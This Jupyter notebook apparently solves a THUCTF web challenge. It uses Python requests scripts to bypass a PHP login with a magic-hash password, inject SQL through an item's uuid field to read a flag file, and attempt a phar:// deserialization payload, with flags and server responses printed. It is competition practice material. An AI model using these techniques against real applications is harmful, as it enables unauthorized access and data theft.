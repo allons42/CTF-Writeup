{
 "cells": [
  {
   "cell_type": "code",
   "execution_count": 2,
   "id": "c16bca2c",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "'flag{simple_php_bypass_f4ffbe58}'"
      ]
     },
     "execution_count": 2,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "session = requests.session()\n",
    "\n",
    "post_dict = {\"cb_user\":\"admin\", \"cb_pass\":\"QNKCDZO\", \"cb_salt\":\"s155964671\", \"action\":\"login\"}\n",
    "\n",
    "r = session.post(\"http://thuctf.redbud.info:32044/code.php?action=xxx\", data=post_dict)\n",
    "\n",
    "r.text"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 3,
   "id": "68920153",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "36\n",
      "$item_uuid:  aaaaaaaa-','lib/flag.php')#*********\n",
      "INSERT INTO items (`name`, `uuid`, `filename`) VALUES ('$item_name', '$item_uuid', '$item_filename')\n",
      "INSERT INTO items (`name`, `uuid`, `filename`) VALUES ('$item_name', 'aaaaaaaa-','lib/flag.php')#*********', '$item_filename')\n"
     ]
    }
   ],
   "source": [
    "uuid = \"a\"*8+\"-\"+\"','lib/flag.php')#*********\"\n",
    "print(len(uuid)) # 8+1+27=36\n",
    "print(\"$item_uuid: \",uuid)\n",
    "print(\"INSERT INTO items (`name`, `uuid`, `filename`) VALUES ('$item_name', '$item_uuid', '$item_filename')\")\n",
    "print(f\"INSERT INTO items (`name`, `uuid`, `filename`) VALUES ('$item_name', '{uuid}', '$item_filename')\")"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 4,
   "id": "5d5d651c",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "flag{simple_php_bypass_f4ffbe58}\n",
      "success\n",
      "--- start abc aaaaaaaa- ---\n",
      "Content: <?php\n",
      "namespace lib;\n",
      "\n",
      "class Flag {\n",
      "    const FLAG1 = 'flag{simple_php_bypass_f4ffbe58}';\n",
      "    const FLAG2 = 'flag{simple_sql_injection_41278e35}';\n",
      "    // FLAG3 is in /flag3, call /readflag3 to read it;\n",
      "}\n",
      "\n",
      "---  end  abc aaaaaaaa- ---\n",
      "\n",
      "\n"
     ]
    }
   ],
   "source": [
    "import requests\n",
    "\n",
    "port = 32044\n",
    "\n",
    "session = requests.session()\n",
    "post_dict = {\"cb_user\":\"admin\", \"cb_pass\":\"QNKCDZO\", \"cb_salt\":\"s155964671\", \"action\":\"login\"}\n",
    "r = session.post(f\"http://thuctf.redbud.info:{port}/code.php?action=xxx\", data=post_dict)\n",
    "print(r.text)\n",
    "\n",
    "uuid = \"a\"*8+\"-\"+\"','lib/flag.php')#*********\"\n",
    "post_dict = {\"item[name]\": [\"abc\"], \"item[uuid]\": uuid, \"item[content]\": \"whatever\"}\n",
    "r = session.post(f\"http://thuctf.redbud.info:{port}/code.php?action=save_item\", data=post_dict)\n",
    "print(r.text)\n",
    "\n",
    "r = session.get(f\"http://thuctf.redbud.info:{port}/code.php?action=list_item\")\n",
    "tmp = r.text\n",
    "tmp = tmp.replace(\"<br/>\",\"\\n\")\n",
    "print(tmp)"
   ]
  },
  {
   "cell_type": "markdown",
   "id": "8dd61751",
   "metadata": {},
   "source": [
    "## try phar"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 5,
   "id": "0c207a70",
   "metadata": {},
   "outputs": [
    {
     "data": {
      "text/plain": [
       "b'<?php __HALT_COMPILER(); ?>\\r\\nE\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x11\\x00\\x00\\x00\\x01\\x00\\x00\\x00\\x00\\x00\\x0f\\x00\\x00\\x00O:4:\"Test\":0:{}\\x08\\x00\\x00\\x00test.php\\x17\\x00\\x00\\x00\\x0b\\xf76c\\x17\\x00\\x00\\x00#K(\\xa9\\xb6\\x01\\x00\\x00\\x00\\x00\\x00\\x00<?php echo \"success\";?>u^\\x86\\xe3\\x10\\xc6\\xd6L\\x07\\x035rFU\\x81\"7\\xdf\\xd8\\x17\\x02\\x00\\x00\\x00GBMB'"
      ]
     },
     "execution_count": 5,
     "metadata": {},
     "output_type": "execute_result"
    }
   ],
   "source": [
    "with open(\"phar.phar\", \"rb\") as f:\n",
    "    content = f.read()\n",
    "content"
   ]
  },
  {
   "cell_type": "code",
   "execution_count": 6,
   "id": "68bbb597",
   "metadata": {},
   "outputs": [
    {
     "name": "stdout",
     "output_type": "stream",
     "text": [
      "success\n",
      "--- start abc aaaaaaaa- ---\n",
      "Content: <?php\n",
      "namespace lib;\n",
      "\n",
      "class Flag {\n",
      "    const FLAG1 = 'flag{simple_php_bypass_f4ffbe58}';\n",
      "    const FLAG2 = 'flag{simple_sql_injection_41278e35}';\n",
      "    // FLAG3 is in /flag3, call /readflag3 to read it;\n",
      "}\n",
      "\n",
      "---  end  abc aaaaaaaa- ---\n",
      "\n",
      "--- start abc aaaaaaaa- ---\n",
      "<br />\n",
      "<b>Warning</b>:  file_get_contents(phar://up/9001.php): failed to open stream: phar error: file &quot;&quot; in phar &quot;up/9001.php&quot; cannot be empty in <b>/var/www/html/code.php</b> on line <b>56</b><br />\n",
      "Content: \n",
      "---  end  abc aaaaaaaa- ---\n",
      "\n",
      "\n"
     ]
    }
   ],
   "source": [
    "payload = \"','phar://up/9001.php')#\"\n",
    "\n",
    "uuid = \"a\"*8+\"-\"+payload+\"b\"*(27-len(payload))\n",
    "post_dict = {\"item[name]\": \"abc\", \"item[uuid]\": uuid, \"item[content]\": content}\n",
    "r = session.post(f\"http://thuctf.redbud.info:{port}/code.php?action=save_item\", data=post_dict)\n",
    "print(r.text)\n",
    "\n",
    "r = session.get(f\"http://thuctf.redbud.info:{port}/code.php?action=list_item\")\n",
    "tmp = r.text\n",
    "tmp = tmp.replace(\"<br/>\",\"\\n\")\n",
    "print(tmp)"
   ]
  }
 ],
 "metadata": {
  "kernelspec": {
   "display_name": "Python [conda env:.conda-hjh]",
   "language": "python",
   "name": "conda-env-.conda-hjh-py"
  }
 },
 "nbformat": 4,
 "nbformat_minor": 5
}
